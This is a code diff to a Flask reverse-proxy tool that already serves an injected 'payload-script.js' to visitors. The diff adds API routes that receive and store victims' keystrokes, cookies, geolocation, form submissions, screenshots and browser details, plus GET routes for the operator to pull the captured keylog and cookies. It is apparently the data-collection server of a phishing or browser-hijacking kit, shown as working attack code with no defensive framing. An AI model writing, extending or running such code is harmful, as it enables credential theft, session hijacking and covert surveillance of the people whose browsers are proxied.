@@ -203,6 +203,31 @@ def start_proxy(target, host, port, secret):
     def serve_payload():
         return send_from_directory('proxy', 'payload-script.js', mimetype='application/javascript')
 
+    @app.route('/ep/api/<path:path>', methods=['GET', 'POST'])
+    def handle_api(path):
+        # This is a catch-all route for /ep/api/* endpoints
+        if request.method == 'GET':
+            if path == 'getKeylog':
+                return get_keylog()
+            elif path == 'getCookies':
+                return get_cookies()
+            elif path == 'serverInfo':
+                return get_server_info()
+        elif request.method == 'POST':
+            if path == 'keylog':
+                return handle_keylog()
+            elif path == 'cookies':
+                return handle_cookies()
+            elif path == 'location':
+                return handle_location()
+            elif path == 'form':
+                return handle_form()
+            elif path == 'screenshot':
+                return handle_screenshot()
+            elif path == 'browser':
+                return handle_browser()
+        return jsonify({'error': 'Not found'}), 404
+
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     def proxy(path):
